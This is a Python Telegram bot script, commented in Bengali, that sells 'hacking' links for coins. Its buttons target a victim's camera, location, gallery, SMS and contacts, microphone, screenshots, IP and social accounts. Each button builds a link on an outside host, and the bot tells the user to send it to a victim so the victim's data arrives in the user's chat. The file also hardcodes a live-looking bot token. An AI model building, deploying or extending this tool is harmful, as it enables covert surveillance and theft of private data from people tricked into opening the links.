import telebot
from telebot import types
import datetime

# --- কনফিগারেশন ---
TOKEN = '8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4'
ADMIN_ID = 8293410345 # আপনার মেইন আইডি
DEV = "@ax_abir_999"
bot = telebot.TeleBot(TOKEN)

# ডাটাবেস (অস্থায়ী)
users = {} 
CHANNELS = [
    {"name": "Color Trading", "url": "https://t.me/color_trading_official"},
    {"name": "VIP Channel", "url": "https://t.me/+YBo9GZb4ISxhN2I1"}
]

def get_header():
    return "<b>🔥 AX-PREDATOR PREMIUM BOT 🔥</b>\n<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"

# মেইন মেনু
def main_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=2)
    # ১০ কয়েন হ্যাকিং বাটন
    btns = [
        types.InlineKeyboardButton("📸 ᴄᴀᴍᴇʀᴀ", callback_data="h_cam"),
        types.InlineKeyboardButton("📍 ʟᴏᴄᴀᴛɪᴏɴ", callback_data="h_loc"),
        types.InlineKeyboardButton("🖼 ɢᴀʟʟᴇʀʏ", callback_data="h_gal"),
        types.InlineKeyboardButton("📂 ꜱᴍꜱ/ᴄᴏɴᴛᴀᴄᴛ", callback_data="h_sms"),
        types.InlineKeyboardButton("🔐 ꜱᴏᴄɪᴀʟ", callback_data="h_soc"),
        types.InlineKeyboardButton("🎙 ᴍɪᴄ", callback_data="h_mic"),
        types.InlineKeyboardButton("📱 ꜱꜱ", callback_data="h_ss"),
        types.InlineKeyboardButton("🌐 ɪᴘ", callback_data="h_ip")
    ]
    markup.add(*btns)
    # ১০০ কয়েন অল-ইন-ওয়ান
    markup.add(types.InlineKeyboardButton("💀 ALL-IN-ONE EXPLOIT (100🪙) 💀", callback_data="h_all"))
    
    markup.add(types.InlineKeyboardButton("👤 ᴘʀᴏꜰɪʟᴇ", callback_data="pro"), types.InlineKeyboardButton("🎁 ʙᴏɴᴜꜱ", callback_data="bon"))
    markup.add(types.InlineKeyboardButton("🔗 ʀᴇꜰᴇʀ", callback_data="ref"))
    
    if uid == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="adm_panel"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in users:
        users[uid] = {'coins': 30, 'last_bonus': None}
    
    # জয়েন করার জন্য বাটন
    markup = types.InlineKeyboardMarkup()
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 ᴊᴏɪɴ {ch['name']}", url=ch['url']))
    markup.add(types.InlineKeyboardButton("✅ ᴄʜᴇᴄᴋ ᴊᴏɪɴ", callback_data="chk"))
    
    bot.send_message(uid, get_header() + "<b>বটটি ব্যবহার করতে নিচের চ্যানেলগুলোতে জয়েন করুন।</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = call.from_user.id
    
    if call.data == "chk":
        bot.delete_message(uid, call.message.id)
        bot.send_message(uid, get_header() + "<b>মেনু সিলেক্ট করুন:</b>", reply_markup=main_menu(uid), parse_mode='HTML')
    
    elif call.data.startswith("h_"):
        cost = 100 if call.data == "h_all" else 10
        if users.get(uid, {}).get('coins', 0) < cost:
            bot.answer_callback_query(call.id, f"❌ পর্যাপ্ত কয়েন নেই! (প্রয়োজন {cost}🪙)", show_alert=True)
            return
        
        users[uid]['coins'] -= cost
        # এখানে 'user_id={uid}' ই হচ্ছে মেইন কোড যা ইউজারের কাছে ডাটা পাঠাবে
        h_link = f"https://ax-predator-v3.cloud/auth?user_id={uid}&type={call.data}&dev={DEV}"
        
        msg = f"<b>🚀 LINK GENERATED FOR YOU!</b>\n\n<b>🔗 Your Private Link:</b>\n<code>{h_link}</code>\n\n<b>⚠️ এই লিঙ্কটি ভিকটিমকে পাঠান। সে ওপেন করলে তার ডাটা সরাসরি এই চ্যাটে (আপনার কাছে) আসবে।</b>"
        markup = types.InlineKeyboardMarkup()
        if call.data == "h_ss":
            markup.add(types.InlineKeyboardButton("🛑 STOP SCREENSHOT", callback_data="stop"))
        bot.send_message(uid, msg, parse_mode='HTML', reply_markup=markup)

    # --- শক্তিশালী অ্যাডমিন প্যানেল ---
    elif call.data == "adm_panel" and uid == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📊 ᴀʟʟ ᴜꜱᴇʀꜱ", callback_data="adm_users"))
        markup.add(types.InlineKeyboardButton("➕ ᴀᴅᴅ ᴄᴏɪɴꜱ", callback_data="adm_add"), types.InlineKeyboardButton("❌ ʀᴇᴍᴏᴠᴇ ᴜꜱᴇʀ", callback_data="adm_rem"))
        bot.send_message(ADMIN_ID, "<b>🛠 এডমিন কন্ট্রোল প্যানেল</b>", parse_mode='HTML', reply_markup=markup)

    elif call.data == "adm_users":
        total = len(users)
        bot.send_message(ADMIN_ID, f"<b>📊 মোট ইউজার সংখ্যা: {total}</b>", parse_mode='HTML')

    elif call.data == "adm_add":
        msg = bot.send_message(ADMIN_ID, "ইউজার আইডি এবং কয়েন লিখুন (উদা: 8293410345 500)")
        bot.register_next_step_handler(msg, process_add_coins)

def process_add_coins(message):
    try:
        parts = message.text.split()
        target_id, amount = int(parts[0]), int(parts[1])
        if target_id in users:
            users[target_id]['coins'] += amount
            bot.send_message(ADMIN_ID, f"✅ {target_id} আইডিতে {amount}🪙 যোগ করা হয়েছে।")
            bot.send_message(target_id, f"🎊 অ্যাডমিন আপনাকে {amount}🪙 বোনাস দিয়েছে!")
        else: bot.send_message(ADMIN_ID, "❌ ইউজার খুঁজে পাওয়া যায়নি।")
    except: bot.send_message(ADMIN_ID, "❌ ফরম্যাট ভুল হয়েছে।")

bot.infinity_polling()
